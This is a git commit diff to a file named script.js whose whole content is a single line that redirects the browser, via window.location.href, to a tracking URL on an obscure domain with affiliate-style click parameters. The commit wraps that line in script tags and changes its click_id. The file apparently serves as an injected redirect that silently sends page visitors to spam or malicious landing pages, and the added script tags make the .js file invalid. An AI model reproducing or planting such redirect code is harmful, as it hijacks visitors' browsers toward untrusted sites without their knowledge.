076ed3cb80b34d3326ba0ce44227680d9ea4b449
rpnzx <149712951+rpnzx@users.noreply.github.com>
2024-01-16 04:22:31 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,3 @@
-window.location.href="https://bgmqao.spiendidate.net/?utm_source=da57dc555e50572d&s1=74105&s2=1822761&s3=SHINOBI_3&click_id=PARADOX3_SAGE&ban=other&j1=1&j5=1&j6=1";
+<script>	
+  window.location.href="https://bgmqao.spiendidate.net/?utm_source=da57dc555e50572d&s1=74105&s2=1822761&s3=SHINOBI_3&click_id=PARADOX3_BLAZE&ban=other&j1=1&j5=1&j6=1";
+  </script>
